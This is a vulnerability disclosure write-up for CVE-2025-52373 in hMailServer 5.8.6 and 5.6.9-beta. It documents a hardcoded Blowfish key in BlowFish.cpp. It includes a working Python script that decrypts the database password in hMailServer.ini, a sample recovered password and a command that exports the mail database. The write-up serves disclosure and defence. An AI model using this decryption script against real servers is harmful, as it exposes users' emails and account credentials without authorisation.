# CVE-2025-52373

**Suggested description:** Use of hardcoded cryptographic key in `BlowFish.cpp` in hMailServer 5.8.6 and 5.6.9-beta allows attacker to decrypt passwords used in database connections from `hMailServer.ini` config file.

**VulnerabilityType Other:** CWE-321: Use of Hard-coded Cryptographic Key

**Vendor of Product:** hMailServer

**Affected Product Code Base:** hMailServer - 5.8.6, 5.6.9-beta

**Affected Component:** `hmailserver/source/Server/Common/Util/BlowFish.cpp`, `hMailServer.ini`

**Attack Type:** Local

**Impact Information Disclosure:** true

**Attack Vectors:** to exploit this, someone can simply adapt the existing functions in the source code into a tool to decrypt passwords that are used in connection strings to SQL servers

**Reference:**
- hMailServer Exploit: https://github.com/mojibake-dev/hMailEnum
- Generic Exploit: https://github.com/mojibake-dev/belskysGambit
- Blog Post: https://mojibake.dev/belskysgambit
- Application: https://github.com/hmailserver/hmailserver

**Discoverer:** Eli Samara

**Detailed Explanation:**

Hardcoded password is set
``` cs
#define NOT_SECRET_KYE "THIS_KEY_IS_NOT_SECRET"
```
> line 20 `hmailserver/source/Server/Common/Util/BlowFish.cpp`

and used 
```cs
   BlowFishEncryptor::BlowFishEncryptor ()
   {
 	   PArray = new DWORD [18] ;
 	   SBoxes = new DWORD [4][256] ;

      String sKey = NOT_SECRET_KYE;
      int iKeyLen = sKey.GetLength();
      BYTE *buf = new BYTE[iKeyLen + 1];
      memset(buf, 0, iKeyLen + 1);
      strncpy_s((char*) buf, iKeyLen+1, Unicode::ToANSI(sKey), iKeyLen);
      
      Initialize(buf, iKeyLen );
     
      delete [] buf;
   }
```
> line 29 `hmailserver/source/Server/Common/Util/BlowFish.cpp`

This is then used to encrypt the database `Password` under `[Database]` in `hMailServer.INI`. 

The flow looks something like this. 
```
hMailServerInnoExtension.iss
	DBSetupQuick.exe
		InitializeInternalDatabase()
			CreateInternalDatabase()
				PasswordGenerator::Generate()
					ini_file_settings_->SetPassword(sPassword);
						WriteIniSetting_();
					
```

When the installer is told to create an internal database it runs the helper program DBSetupQuick.exe which performs a flow demonstrated above.

The value field written looks like this. `Password=fb8f1b06f59cf34cf99164835d6ae736`

when fed to this script 
```python
from Crypto.Cipher import Blowfish

def blowfish_decrypt_le(cipher_hex: str, key: bytes = b"THIS_KEY_IS_NOT_SECRET") -> str:
    # Convert hex to bytes
    ct = bytes.fromhex(cipher_hex)
    bs = Blowfish.block_size  # 8 bytes per block
    
    # Initialize ECB cipher
    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
    plaintext_bytes = b''

    # Process each 8-byte block
    for i in range(0, len(ct), bs):
        block = ct[i:i+bs]
        # Reverse each 4-byte word to match encryption pre-transform
        le_block = block[:4][::-1] + block[4:][::-1]
        # Decrypt
        dec_le = cipher.decrypt(le_block)
        # Reverse words back to big-endian
        dec_be = dec_le[:4][::-1] + dec_le[4:][::-1]
        plaintext_bytes += dec_be

    # Strip trailing zero-byte padding
    plaintext_bytes = plaintext_bytes.rstrip(b'\x00')
    # Decode to UTF-8
    return plaintext_bytes.decode('utf-8', errors='ignore')


# Example self-test
if __name__ == "__main__":
    test_ct = "fb8f1b06f59cf34cf99164835d6ae736"
    recovered = blowfish_decrypt_le(test_ct)
    print("Recovered plaintext:", recovered)
```

I retrieve the value `Recovered plaintext: 5C7662397665`

This then unlocks the database and allows me to export it as a more readable .sql script that will generate a sqlite db using this tool https://github.com/ErikEJ/SqlCeToolbox

```cmd
> .\ExportSqlCe.exe "Data Source=hMailServer.sdf;Password=5C7662397665;" hMailServer.sql sqlite
Initializing....
Generating the tables....
Generating the data....
Generating the indexes....
Sent script to output file(s) : hMailServer.sql in 633 ms
```

With this you now have access to emails and account information.
